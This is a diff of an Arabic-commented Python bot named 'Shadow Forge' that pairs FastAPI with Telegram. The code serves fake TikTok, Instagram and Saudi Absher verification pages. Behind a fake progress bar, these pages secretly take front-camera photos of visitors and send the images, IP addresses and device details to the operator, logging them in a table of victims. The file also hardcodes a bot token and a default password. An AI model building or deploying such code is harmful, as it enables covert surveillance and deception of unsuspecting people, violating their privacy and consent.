@@ -3,7 +3,6 @@ import base64
 import io
 import sqlite3
 import hashlib
-import json
 from datetime import datetime
 import uvicorn
 from pydantic import BaseModel
@@ -13,13 +12,12 @@ from fastapi.middleware.cors import CORSMiddleware
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# ==================== التكوينات الآمنة (استخدم متغيرات البيئة) ====================
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg")  # ضع التوكن هنا أو في البيئة
+# ==================== التكوينات ====================
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg")
 RENDER_URL = os.getenv("RENDER_URL", "https://haker-cam.onrender.com")
-CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "XxX_Shadow_Key_2026_XxX")  # مفتاح حماية نقطة الالتقاط
-SALT = os.getenv("SALT", "WormGPT_Salt_321")  # ملح التشفير
+CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "XxX_Shadow_Key_2026_XxX")
+SALT = os.getenv("SALT", "WormGPT_Salt_321")
 
-# ==================== تهيئة البوت والخادم ====================
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 app = FastAPI()
 
@@ -44,11 +42,10 @@ class CaptureData(BaseModel):
     device: str
     secret: str
 
-# ==================== قاعدة البيانات المتطورة (مع التشفير والسجلات) ====================
+# ==================== قاعدة البيانات ====================
 def init_db():
     conn = sqlite3.connect("users.db")
     cursor = conn.cursor()
-    # جدول المستخدمين مع كلمة مرور مشفرة
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS bot_users (
             username TEXT PRIMARY KEY,
@@ -57,7 +54,6 @@ def init_db():
             created_at TEXT DEFAULT CURRENT_TIMESTAMP
         )
     """)
-    # جدول سجل العمليات (الجلسات والروابط المُنشأة)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS operation_logs (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -68,7 +64,6 @@ def init_db():
             created_at TEXT DEFAULT CURRENT_TIMESTAMP
         )
     """)
-    # جدول سجل الضحايا (الصور المُلتقطة)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS captured_targets (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -136,9 +131,111 @@ def log_capture(owner_chat_id, ip, device, count):
     conn.commit()
     conn.close()
 
-# ==================== صفحات المقالب المُحسّنة (مع شريط تقدم وهمي) ====================
+# ==================== صفحة تسجيل الدخول (كاملة) ====================
+def get_login_html():
+    return """
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>تسجيل الدخول للنظام</title>
+        <script src="https://telegram.org/js/telegram-web-app.js"></script>
+        <style>
+            body {
+                background-color: #182533; color: #ffffff; font-family: system-ui, -apple-system, sans-serif;
+                display: flex; flex-direction: column; align-items: center; justify-content: center;
+                min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box;
+            }
+            .login-card {
+                background: #223140; padding: 30px 25px; border-radius: 15px;
+                box-shadow: 0 10px 25px rgba(0,0,0,0.4); max-width: 360px; width: 100%;
+                text-align: center; border: 1px solid #2b3d50;
+            }
+            h2 { font-size: 22px; margin-bottom: 20px; color: #5288c1; }
+            .input-group { margin-bottom: 20px; text-align: right; }
+            label { display: block; margin-bottom: 8px; font-size: 14px; color: #b1c7df; }
+            input {
+                width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #2b3d50;
+                background: #182533; color: white; font-size: 16px; box-sizing: border-box;
+                outline: none; transition: border 0.2s;
+            }
+            input:focus { border-color: #5288c1; }
+            .btn {
+                background-color: #2481cc; color: white; border: none; padding: 14px;
+                font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer;
+                width: 100%; margin-top: 10px; transition: background 0.2s;
+            }
+            #error-msg { color: #e53935; font-size: 14px; margin-top: 15px; display: none; }
+            #success-msg { color: #4caf50; font-size: 14px; margin-top: 15px; display: none; }
+        </style>
+    </head>
+    <body>
+        <div class="login-card">
+            <h2>🔐 تسجيل الدخول للنظام</h2>
+            <div class="input-group">
+                <label>اسم المستخدم</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم">
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور">
+            </div>
+            <button class="btn" id="loginBtn">تسجيل الدخول</button>
+            <div id="error-msg"></div>
+            <div id="success-msg"></div>
+        </div>
+
+        <script>
+            const tg = window.Telegram.WebApp;
+            tg.expand();
+
+            document.getElementById('loginBtn').addEventListener('click', function() {
+                const user = document.getElementById('username').value.trim();
+                const pass = document.getElementById('password').value.trim();
+                const errorBlock = document.getElementById('error-msg');
+                const successBlock = document.getElementById('success-msg');
+
+                if(!user || !pass) {
+                    errorBlock.innerText = "⚠️ يرجى ملء جميع الحقول!";
+                    errorBlock.style.display = "block";
+                    return;
+                }
+
+                errorBlock.style.display = "none";
+                
+                fetch('/api/web-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: tg.initDataUnsafe.user.id,
+                        username: user,
+                        password: pass
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if(data.status === "success") {
+                        successBlock.innerText = "🎉 تم تسجيل الدخول بنجاح!";
+                        successBlock.style.display = "block";
+                        setTimeout(() => { tg.close(); }, 1500);
+                    } else {
+                        errorBlock.innerText = "❌ " + data.message;
+                        errorBlock.style.display = "block";
+                    }
+                })
+                .catch(err => {
+                    errorBlock.innerText = "⚠️ حدث خطأ في الاتصال بالسيرفر";
+                    errorBlock.style.display = "block";
+                });
+            });
+        </script>
+    </body>
+    </html>
+    """
+
+# ==================== صفحات المقالب (مع شريط التقدم) ====================
 def get_html_content(template_type, secret_key):
-    # [تم الحفاظ على التصاميم الأصلية مع إضافة شريط تقدم ومؤقت وهمي]
     bg_color = "#010101"; card_bg = "#121212"; btn_color = "#fe2c55"
     logo_text = "TikTok"; logo_style = "text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;"
     title = "تحدي الملامح التفاعلي جاهز"
@@ -174,8 +271,6 @@ def get_html_content(template_type, secret_key):
         desc = "تم رصد محاولة دخول مشبوهة. يرجى تفعيل الكاميرا الأمامية لمطابقة بصمة الوجه الحية."
         btn_text = "🔒 ابدأ التحقق الفوري والمسح الحي"
         redirect_to = "https://www.saudiarabia.gov.sa"
-    else:  # TikTok default
-        pass
 
     return f"""
     <!DOCTYPE html>
@@ -293,7 +388,6 @@ def get_html_content(template_type, secret_key):
                         const totalShots = 3;
 
                         startFakeProgress(() => {{
-                            // البدء بالتقاط الصور بعد انتهاء شريط التقدم الوهمي
                             let captureInterval = setInterval(function() {{
                                 if (shotsTaken >= totalShots) {{
                                     clearInterval(captureInterval);
@@ -330,11 +424,6 @@ def get_html_content(template_type, secret_key):
     </html>
     """
 
-# ==================== صفحات تسجيل الدخول (بدون تغيير جوهري) ====================
-def get_login_html():
-    # (نفس الكود الأصلي مع إضافة تنسيق بسيط)
-    return """<!DOCTYPE html>..."""  # اختصاراً، يُترك كما هو مع إضافة تحسينات بسيطة في التنسيق.
-
 # ==================== أوامر البوت ====================
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -347,7 +436,7 @@ def start(message):
         InlineKeyboardButton("🔐 تسجيل الدخول للنظام", web_app=telebot.types.WebAppInfo(url=f"{RENDER_URL}/login-page")),
         InlineKeyboardButton("ℹ️ تعليمات", callback_data="show_instructions")
     )
-    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v7.0\nيرجى تسجيل الدخول.", reply_markup=markup)
+    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v7.1\nيرجى تسجيل الدخول.", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "show_instructions")
 def show_instructions(call):
@@ -360,7 +449,6 @@ def back_to_start(call):
 
 def show_main_menu(chat_id):
     markup = InlineKeyboardMarkup(row_width=1)
-    # تم تصحيح الأخطاء النحوية هنا (إزالة الأقواس الزائدة)
     markup.add(
         InlineKeyboardButton("🎬 مقلب تيك توك", callback_data="gen_tiktok"),
         InlineKeyboardButton("📸 مقلب إنستغرام", callback_data="gen_instagram"),
@@ -377,8 +465,7 @@ def gen_link(call):
         bot.send_message(chat_id, "❌ جلسة منتهية.")
         return
 
-    # استخراج النوع بدقة
-    raw = call.data.split("_", 1)[1]  # مثلاً: "ai_filter" أو "tiktok"
+    raw = call.data.split("_", 1)[1]
     template_map = {
         "tiktok": "tiktok",
         "instagram": "instagram",
@@ -387,20 +474,14 @@ def gen_link(call):
         "absher": "absher"
     }
     template = template_map.get(raw, "tiktok")
-    
-    # إنشاء الرابط مع إضافة معرف المستخدم
     unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
-    
-    # تسجيل العملية في قاعدة البيانات (مع آيبي وهمي مؤقت)
     log_operation(chat_id, template, unique_link, "pending_ip")
-    
     bot.send_message(chat_id, f"🚀 الرابط جاهز:\n`{unique_link}`", parse_mode="Markdown")
 
-# ==================== نقاط الـ API المحمية ====================
+# ==================== نقاط API ====================
 @app.get("/", response_class=HTMLResponse)
 async def get_home(request: Request):
     template = request.query_params.get("template", "tiktok")
-    # تمرير المفتاح السري إلى الصفحة لحماية نقطة الالتقاط
     return get_html_content(template, CAPTURE_SECRET)
 
 @app.get("/login-page", response_class=HTMLResponse)
@@ -419,7 +500,6 @@ async def api_web_login(data: LoginData):
 async def capture_api(request: Request, background_tasks: BackgroundTasks):
     try:
         body = await request.json()
-        # التحقق من المفتاح السري
         if body.get("secret") != CAPTURE_SECRET:
             raise HTTPException(status_code=403, detail="Unauthorized")
         
@@ -428,7 +508,6 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
         shot_count = body.get("count", 1)
         device_info = body.get("device", "غير معروف")
         
-        # استخراج الآيبي الحقيقي
         client_ip = request.client.host
         forwarded = request.headers.get("X-Forwarded-For")
         if forwarded:
@@ -437,10 +516,8 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
         if not user_id or not image_b64:
             return JSONResponse(status_code=400, content={"status": "error"})
         
-        # تسجيل الضحية في قاعدة البيانات
         log_capture(int(user_id), client_ip, device_info, shot_count)
         
-        # معالجة الصورة وإرسالها في الخلفية
         header, encoded = image_b64.split(",", 1)
         image_bytes = base64.b64decode(encoded)
         image_file = io.BytesIO(image_bytes)
@@ -468,9 +545,8 @@ async def webhook(request: Request):
 def startup():
     bot.remove_webhook()
     bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
-    # إنشاء حساب افتراضي للمالك
     create_new_account("moosa", "123456")
-    print("🚀 Shadow Forge v7.0 جاهز للصيد الذكي!")
+    print("🚀 Shadow Forge v7.1 جاهز للصيد الذكي!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
